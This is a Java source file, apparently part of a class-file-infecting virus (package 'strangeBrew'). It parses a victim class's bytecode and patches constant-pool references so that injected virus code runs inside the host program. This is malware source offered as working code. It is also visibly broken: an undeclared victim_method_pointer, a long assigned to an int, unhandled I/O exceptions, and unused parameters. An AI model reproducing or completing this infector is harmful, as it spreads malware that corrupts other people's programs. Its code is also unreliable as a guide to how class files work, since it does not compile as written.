package strangeBrew;

import java.io.RandomAccessFile;

public class CodeUpdate2 {
	public static void updateTheCodes(final RandomAccessFile victim,byte bytes[], final int method_start_index,
			final int code_start_index, int virus_code_length, int delta_offset) {
		int fpointer = victim.getFilePointer();
		
		//fpointer must be at the start of the executable code  
		while (fpointer < (victim_method_pointer + virus_code_length + 24)) {
			int data1;
			int total_nulls;
			int tag = victim.readUnsignedByte();
			fpointer++;
			switch (tag) {
			//the default is a one byte instruction 
			default:
				break;
			//these are all of the two byte instructions 
			case 16:
			case 21:
			case 22:
			case 23:
			case 24:
			case 25:
			case 54:
			case 55:
			case 56:
			case 57:
			case 58:
			case 169:
			case 188:
				fpointer++;
				break;
			//these are all of the three byte instructions 
			case 17:
			case 132:
			case 153:
			case 154:
			case 155:
			case 156:
			case 157:
			case 158:
			case 159:
			case 160:
			case 161:
			case 162:
			case 163:
			case 164:
			case 165:
			case 166:
			case 167:
			case 168:
			case 198:
			case 199:
				fpointer += 2;
				break;
			//these are all of the five byte instructions 
			case 200:
			case 201:
				fpointer += 4;
				break;

			//these are all of the referencing instructions 
			case 18:
				data1 = victim.readUnsignedByte();
				victim.seek(fpointer);
				victim.writeByte(data1 + delta_offset);
				fpointer++;
				break;
			case 19:
			case 20:
			case 178:
			case 179:
			case 180:
			case 181:
			case 182:
			case 183:
			case 184:
			case 187:
			case 189:
			case 192:
			case 193:
				data1 = victim.readUnsignedShort();
				victim.seek(fpointer);
				victim.writeShort(data1 + delta_offset);
				fpointer += 2;
				break;
			case 197:
				data1 = victim.readUnsignedShort();
				victim.seek(fpointer);
				victim.writeShort(data1 + delta_offset);
				fpointer += 3;
				break;
			case 185:
				data1 = victim.readUnsignedShort();
				victim.seek(victim_method_pointer);
				victim.writeShort(data1 + delta_offset);
				fpointer += 4;
				break;
			//these are all of the variable length instructions 
			case 170:
				total_nulls =
						3 - (fpointer - 1 - (victim_method_pointer + 24)) % 4;
				for (int i = 0; i < total_nulls; i++) {
					tag = victim.readUnsignedByte();
					fpointer++;
				}
				fpointer += 4;
				victim.seek(fpointer);
				int low = victim.readInt();
				int high = victim.readInt();
				fpointer += 8 + 4 * (high - low + 1);
				break;
			case 171:
				total_nulls =
						3 - (fpointer - 1 - (victim_method_pointer + 24)) % 4;
				for (int i = 0; i < total_nulls; i++) {
					tag = victim.readUnsignedByte();
					fpointer++;
				}
				fpointer += 4;
				victim.seek(fpointer);
				int npairs = victim.readInt();
				fpointer += 4 + 8 * npairs;
				break;
			case 196:
				tag = victim.readUnsignedByte();
				if (tag == 132)
					fpointer += 4;
				else
					fpointer += 2;
				break;
			} // end of switch 
			victim.seek(fpointer);
		} //end of for loop  
	}
}
